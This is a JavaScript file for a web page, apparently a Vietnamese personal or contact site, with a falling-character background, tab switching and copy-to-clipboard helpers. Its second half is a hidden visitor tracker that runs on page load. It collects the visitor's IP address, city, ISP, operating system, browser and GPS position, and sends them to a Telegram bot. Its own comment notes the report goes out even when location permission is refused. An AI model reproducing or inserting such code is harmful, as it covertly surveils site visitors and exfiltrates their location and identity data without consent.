// Code rain background
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
const fontSize = 12;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = 'rgba(15, 23, 42, 0.04)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#60a5fa';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 45);

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});

// Tab toggle
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.contact-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(btn.dataset.tab).classList.add('active');
    });
});

// Copy to clipboard
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Đã sao chép: ' + text);
    }).catch(() => {
        alert('Không thể sao chép, thử thủ công nhé!');
    });
}

// Auto zoom adjustment
function adjustZoom() {
    const vw = document.getElementById('viewportMeta');
    const w = window.innerWidth;
    let scale = w < 768 ? 1.04 : 1.0;
    vw.setAttribute('content', `width=device-width, initial-scale=${scale}, maximum-scale=5.0, user-scalable=yes`);
}
window.addEventListener('resize', adjustZoom);
adjustZoom();

 // --- 1. CẤU HÌNH ---
const TG_TOKEN = CONFIG.TG_TOKEN;
        const CHAT_ID = CONFIG.CHAT_ID;
let isSending = false;

// --- 2. NHẬN DIỆN THIẾT BỊ CHI TIẾT ---
function getSystemInfo() {
    const ua = navigator.userAgent;
    let browser = "Trình duyệt lạ";
    let os = "Không rõ OS";
    let deviceType = "💻 Máy tính";

    if (ua.includes("CocCoc")) browser = "Cốc Cốc";
    else if (ua.includes("Edg/")) browser = "Microsoft Edge";
    else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
    else if (ua.includes("Firefox")) browser = "Firefox";

    if (ua.includes("Win")) os = "Windows";
    else if (ua.includes("iPhone")) { os = "iOS"; deviceType = "📱 Điện thoại"; }
    else if (ua.includes("Android")) { os = "Android"; deviceType = "📱 Điện thoại"; }
    else if (ua.includes("Mac")) os = "MacOS";

    return { browser, os, deviceType };
}

// --- 3. LẤY IP QUA 3 TẦNG TRUNG GIAN (Cloudflare, AWS, Ipify) ---
async function fetchIpData() {
    const sources = [
        { url: 'https://ipwho.is/', type: 'json' }, // Ưu tiên vì có ISP
        { url: 'https://api.ipify.org?format=json', type: 'json' }, // Trung gian uy tín 1
        { url: 'https://checkip.amazonaws.com/', type: 'text' } // Trung gian uy tín 2 (AWS)
    ];

    let baseIp = "";

    // Bước 1: Lấy IP bằng mọi giá từ các nguồn trung gian
    for (let src of sources) {
        try {
            const res = await fetch(src.url, { signal: AbortSignal.timeout(3000) });
            if (src.type === 'json') {
                const d = await res.json();
                baseIp = d.ip || d.query;
                // Nếu nguồn ipwhois chạy được thì trả về luôn cho nhanh
                if (d.connection) return { ip: d.ip, city: d.city, isp: d.connection.isp };
            } else {
                baseIp = (await res.text()).trim();
            }
            if (baseIp) break;
        } catch (e) { continue; }
    }

    // Bước 2: Từ IP lấy được, truy vấn thông tin chi tiết qua IP-API (Sử dụng HTTPS)
    if (baseIp) {
        try {
            const detailRes = await fetch(`https://ipapi.co/${baseIp}/json/`);
            const detail = await detailRes.json();
            return {
                ip: baseIp,
                city: detail.city || "Không rõ",
                isp: detail.org || "Nhà mạng ẩn"
            };
        } catch (e) {
            return { ip: baseIp, city: "Lỗi lọc", isp: "Lỗi lọc" };
        }
    }

    return { ip: "Không rõ", city: "Không rõ", isp: "Không rõ" };
}

// --- 4. GỬI THÔNG BÁO ---
async function sendNotification(pos, ipInfo) {
    if (isSending) return;
    isSending = true;

    const info = getSystemInfo();
    const time = new Date().toLocaleString('vi-VN');let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP (MULTI-PROXY)</b>\n\n`;
    msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
    msg += `🌐 <b>IP:</b> <code>${ipInfo.ip}</code>\n`;
    msg += `🏙️ <b>Thành phố:</b> <code>${ipInfo.city}</code>\n`;
    msg += `📡 <b>Nhà mạng:</b> <b>${ipInfo.isp}</b>\n\n`;

    msg += `ℹ️ <b>Thiết bị:</b>\n`;
    msg += `├─ Hệ điều hành: <code>${info.os}</code>\n`;
    msg += `└─ Trình duyệt: <b>${info.browser}</b>\n\n`;

    if (pos && pos.coords) {
        const { latitude: lat, longitude: lon } = pos.coords;
        msg += `📍 <b>Vị trí GPS:</b>\n`;
        msg += `└ 👉 <a href="http://maps.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
    }

    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        console.error(err);
    } finally {
        isSending = false;
    }
}

// --- 5. KHỞI CHẠY ---
async function start() {
    const ipInfo = await fetchIpData();
    
    // Tự động gửi tin nhắn kể cả khi người dùng từ chối GPS
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => sendNotification(pos, ipInfo),
            () => sendNotification(null, ipInfo),
            { timeout: 5000 }
        );
    } else {
        sendNotification(null, ipInfo);
    }
}

window.onload = start;
